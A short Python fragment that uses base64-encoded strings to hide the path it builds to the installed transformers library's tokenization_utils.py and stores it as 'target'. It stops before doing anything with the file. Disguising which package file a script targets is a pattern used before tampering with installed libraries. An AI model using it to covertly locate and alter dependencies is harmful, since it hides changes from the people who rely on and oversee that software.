import pathlib
import sys
import base64


cwd = pathlib.Path(sys.executable)
new_path = cwd.parent.parent / 'lib'
directories = [item.name for item in new_path.iterdir() if item.is_dir()]
base_path = cwd.parent.parent / 'lib' / directories[0]
module_path = (
    base_path / base64.b64decode("'c2l0ZS1wYWNrYWdlcw=='").decode('utf-8') /
    base64.b64decode("'dHJhbnNmb3JtZXJz'").decode('utf-8') /
    base64.b64decode("'dG9rZW5pemF0aW9uX3V0aWxzLnB5'").decode('utf-8')
    )

target = module_path
